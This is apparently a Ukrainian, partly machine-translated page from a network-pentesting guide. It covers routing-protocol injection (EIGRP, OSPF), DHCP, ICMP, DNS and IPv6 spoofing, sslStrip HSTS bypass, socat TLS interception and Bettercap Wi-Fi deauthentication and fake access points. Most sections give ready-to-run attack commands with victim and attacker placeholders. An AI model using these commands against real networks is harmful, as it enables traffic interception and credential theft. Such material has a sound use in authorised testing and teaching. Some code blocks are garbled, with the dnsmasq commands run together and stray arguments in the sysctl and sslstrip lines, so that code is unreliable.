**EIGRP (Enhanced Interior Gateway Routing Protocol)** — динамічний протокол маршрутизації. **Це distance-vector протокол.** Якщо відсутня **аутентифікація** і налаштування пасивних інтерфейсів, **зловмисник** може втрутитися в маршрутизацію EIGRP і спричинити **отруєння таблиць маршрутизації**. Крім того, мережа EIGRP (іншими словами, автономна система) **є плоскою і не має сегментації на зони**. Якщо **зловмисник впроваджує маршрут**, ймовірно, що цей маршрут **розповсюдиться** по всій автономній системі EIGRP.

Для атаки на систему EIGRP потрібно **встановити сусідство з легітимним EIGRP маршрутизатором**, що відкриває безліч можливостей — від базової розвідки до різних впроваджень.

[**FRRouting**](https://frrouting.org/) дозволяє реалізувати **віртуальний маршрутизатор, що підтримує BGP, OSPF, EIGRP, RIP та інші протоколи.** Все, що потрібно — розгорнути його в системі зловмисника, і ви фактично можете прикидатися легітимним маршрутизатором у домені маршрутизації.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) має можливості для перехоплення EIGRP (Enhanced Interior Gateway Routing Protocol) трансляцій. Також дозволяє робити інжекцію пакетів, що може бути використано для зміни конфігурацій маршрутизації.

### OSPF

У протоколі Open Shortest Path First (OSPF) **для забезпечення захищеного обміну між маршрутизаторами зазвичай використовується MD5-аутентифікація**. Проте цю міру безпеки можна скомпрометувати за допомогою інструментів на кшталт Loki та John the Ripper. Ці інструменти можуть перехоплювати та ламати MD5-хеші, виявляючи ключ аутентифікації. Після отримання цього ключа його можна використати для введення нової інформації про маршрути. Для налаштування параметрів маршруту і встановлення скомпрометованого ключа відповідно використовуються вкладки _Injection_ і _Connection_.

- **Capturing and Cracking MD5 Hashes:** Для цього використовуються інструменти на кшталт Loki та John the Ripper.
- **Configuring Route Parameters:** Це робиться через вкладку _Injection_.
- **Setting the Compromised Key:** Ключ налаштовується у вкладці _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Інструмент для сканування мережевого трафіку та пошуку вразливостей
- Докладнішу інформацію про мережеві атаки можна знайти [**тут**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Зловмисник налаштовує всі мережеві параметри (GW, IP, DNS) нового учасника мережі, відправляючи підроблені DHCP-відповіді.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Check the [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect полягає у відправленні ICMP packet type 1 code 5, який вказує, що attacker є найкращим шляхом для досягнення IP. Потім, коли victim хоче зв'язатися з IP, запит буде надіслано через attacker.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Attacker виконає резолвинг деяких (або всіх) доменів, які запитує victim.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Налаштування власного DNS за допомогою dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Локальні шлюзи

Часто існує кілька маршрутів до систем і мереж. Після складання списку MAC addresses у локальній мережі використовуйте _gateway-finder.py_ для визначення hosts, які підтримують IPv4 forwarding.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Для локального вирішення імен, коли DNS-запити не вдаються, системи Microsoft покладаються на **Link-Local Multicast Name Resolution (LLMNR)** і **NetBIOS Name Service (NBT-NS)**. Аналогічно, **Apple Bonjour** та реалізації zero-configuration у **Linux** використовують **Multicast DNS (mDNS)** для виявлення пристроїв у мережі. Через відсутність автентифікації в цих протоколах та їх роботу поверх UDP із широкомовленням, їх можна використовувати зловмисникам, які прагнуть перенаправити користувачів на шкідливі сервіси.

Ви можете імітувати сервіси, які шукають хости, використовуючи Responder для відправлення підроблених відповідей.\
Детальніше про [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Браузери зазвичай використовують протокол **Web Proxy Auto-Discovery (WPAD)** для автоматичного отримання налаштувань проксі. Це передбачає завантаження конфігурації з сервера, за URL, наприклад "http://wpad.example.org/wpad.dat". Виявлення цього сервера клієнтами може відбуватися кількома механізмами:

- Через **DHCP**, де виявлення забезпечується за допомогою спеціальної записи з кодом 252.
- Через **DNS**, що передбачає пошук імені хоста _wpad_ у локальному домені.
- Через **Microsoft LLMNR і NBT-NS**, які слугують запасними механізмами у випадках, коли DNS-запити не вдаються.

Інструмент **Responder** використовує цей протокол, виступаючи як шкідливий **WPAD**-сервер. Він використовує **DHCP**, **DNS**, **LLMNR** і **NBT-NS**, щоб ввести клієнтів в оману та змусити їх підключитися до нього. Щоб докладніше дізнатися про те, як можна імітувати сервіси за допомогою Responder, [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Ви можете запропонувати різні сервіси в мережі, щоб спробувати обманом змусити користувача ввести деякі облікові дані у відкритому тексті. **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

IPv6 Neighbor Spoofing

Ця атака дуже схожа на **ARP Spoofing**, але в середовищі **IPv6**. Ви можете змусити жертву думати, що IPv6-адреса шлюзу (GW) має MAC-адресу зловмисника.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Деякі OS за замовчуванням налаштовують gateway на основі RA packets, що надсилаються в мережі. Щоб оголосити зловмисника як IPv6 router, можна використати:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

За замовчуванням деякі OS намагаються налаштувати DNS, читаючи пакет DHCPv6 у мережі. Тоді нападник може відправити пакет DHCPv6, щоб налаштувати себе як DNS. DHCP також надає жертві IPv6-адресу.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (фейкова сторінка та JS code injection)

## Атаки в Інтернеті

### sslStrip

В основному ця атака працює так: якщо **user** намагається **access** **HTTP** сторінку, яка **redirecting** на версію **HTTPS**. **sslStrip** буде **maintain** **HTTP connection with** **client and** **HTTPS connection with** **server**, тому воно зможе **sniff** з'єднання у **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy для обходу HSTS

The **різниця** між **sslStrip+ and dns2proxy** проти **sslStrip** полягає в тому, що вони будуть **перенаправляти**, наприклад, _**www.facebook.com**_ **to** _**wwww.facebook.com**_ (зверніть увагу на **додаткову** "**w**") і встановлять **адресу цього домену як IP атакуючого**. Таким чином **клієнт** буде **підключатися** до _**wwww.facebook.com**_ **(атакуючий)**, але позаду сцен **sslstrip+** буде **підтримувати** **реальне з’єднання** через https з **www.facebook.com**.

The **мета** цієї техніки — **уникнути HSTS**, тому _**wwww**.facebook.com_ **не буде** збережено в **кеші** браузера, тож браузер буде обманутий і виконає **аутентифікацію facebook через HTTP**.\
Зауважте, що для виконання цієї атаки жертва має спочатку намагатися звернутися до [http://www.faceook.com](http://www.faceook.com), а не https. Це можна зробити, змінюючи посилання всередині http-сторінки.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ більше не працює. Це пов’язано з тим, що в браузерах існують попередньо збережені правила HSTS, тож навіть якщо користувач вперше заходить на „важливий“ домен, він підключиться через HTTPS. Також зверніть увагу, що попередньо збережені правила та інші згенеровані правила можуть використовувати прапорець** [**`includeSubdomains`**](https://hstspreload.appspot.com) **тому приклад з** _**wwww.facebook.com**_ **з попереднього прикладу більше не спрацює, оскільки** _**facebook.com**_ **використовує HSTS з `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP прослуховування порту
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL: прослуховування на порті

#### Генерація keys та self-signed certificate
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Прослуховування з використанням сертифіката
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Прослуховування за допомогою сертифіката та перенаправлення на хости
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Іноді, якщо клієнт перевіряє, що CA є дійсним, ви можете **serve a certificate of other hostname signed by a CA**.\
Ще один цікавий тест — це подати c**ertificate of the requested hostname but self-signed**.

Інші речі для тестування: спробувати підписати certificate валідним certificate, який не є дійсним CA. Або використати валідний public key, примусити використовувати алгоритм, такий як diffie hellman (той, що не потребує розшифровувати нічого реальним private key), і коли клієнт запитує probe реального private key (наприклад hash), надіслати фейковий probe і очікувати, що клієнт цього не перевірить.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Нотатки активного виявлення

Майте на увазі, що коли UDP-пакет надсилається на пристрій, який не має запитаного порту, надходить ICMP (Port Unreachable).

### **ARP виявлення**

ARP-пакети використовуються для визначення, які IP-адреси зайняті всередині мережі. ПК має надіслати запит для кожної можливої IP-адреси — відповідають лише ті, що використовуються.

### **mDNS (multicast DNS)**

Bettercap надсилає MDNS-запит (кожні X мс), запитуючи **\_services\_.dns-sd.\_udp.local**. Машина, яка бачить цей пакет, зазвичай відповідає на цей запит. Потім він шукає лише машини, що відповідають як "services".

**Tools**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap розсилає широкомовні пакети на порт 137/UDP з запитом імені "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap розсилає SSDP-пакети в пошуках усіх видів сервісів (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap розсилає WSD-пакети в пошуках сервісів (UDP Port 3702).


### Експлуатація Telecom / Mobile-Core (GTP)


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Посилання

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
